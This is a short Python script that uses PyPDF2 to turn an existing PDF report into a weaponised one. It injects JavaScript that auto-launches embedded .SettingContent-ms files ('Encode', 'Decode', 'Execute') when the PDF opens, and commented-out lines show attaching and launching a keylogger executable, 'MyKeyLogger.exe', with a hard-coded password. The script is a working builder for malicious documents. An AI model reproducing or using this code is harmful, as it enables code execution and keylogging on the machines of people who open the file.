import PyPDF2


pdf_file = "rapport_pop_malicious.pdf"
output_pdf = "rapport_pop_js.pdf"
# payload_path = "MyKeyLogger.b64"
# exe_name = "MyKeyLogger.exe"
# password = "B%a3N[Nek6+_M;}P"

with open(pdf_file, "rb") as file_:
    pdf = PyPDF2.PdfFileReader(file_)

    # Creating writer object
    writer = PyPDF2.PdfFileWriter()

    # Re-adding pages
    for page in range(pdf.getNumPages()):
        writer.addPage(pdf.getPage(page))

    # Embed payload
    # payload = open(payload_path, "rb")

    # writer.addAttachment(''+exe_name, payload.read())

    # writer.encrypt(password)

    # JS to auto launch exe (https://nora.codes/post/pdf-embedding-attacks/)
    # writer.addJS("app.alert('test')")
    # writer.addJS("this.exportDataObject({cName: MyKeyLogger.exe, nLaunch: 2});")
    # writer.addJS('var files = ["PutFile", "Decode", "Execute"]; for (var i = 0; i < files.len; i++) {this.exportDataObject({cName: files[i] + ".SettingContent-ms",nLaunch: 2,});}')
    # writer.addJS('this.exportDataObject({cName: "Encode.SettingContent-ms", nLaunch: 2});')
    # writer.addJS('this.exportDataObject({cName: "Decode.SettingContent-ms", nLaunch: 2});')
    # writer.addJS('this.exportDataObject({cName: "Execute.SettingContent-ms", nLaunch: 2});')
    writer.addJS("var files = [\"Encode\", \"Decode\", \"Execute\"]; for (var i = 0; i < files.length; i++) { this.exportDataObject( {cName: files[i] + \".SettingContent-ms\", nLaunch: 2} ); }")

    with open(output_pdf, 'wb') as fh:
        writer.write(fh)
